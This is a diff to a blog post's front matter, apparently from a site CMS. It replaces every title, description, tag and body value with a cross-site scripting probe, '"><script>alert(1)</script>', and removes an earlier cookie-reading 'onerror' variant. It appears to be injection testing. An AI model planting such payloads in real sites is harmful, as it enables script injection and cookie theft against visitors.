@@ -1,9 +1,10 @@
 ---
-title: '"><img src=x onerror=alert(document.cookie)>'
+title: '"><script>alert(1)</script>'
 date: 2025-09-10T04:07:00.000+03:00
-description: '"><img src=x onerror=alert(document.cookie)>'
+description: '"><script>alert(1)</script>'
 thumbnail: /uploads/gy86rraxkaatfyr.jpg
 tags:
-  - "1"
+  - '"><script>alert(1)</script>'
+  - ""
 ---
-1
+"><script>alert(1)</script>
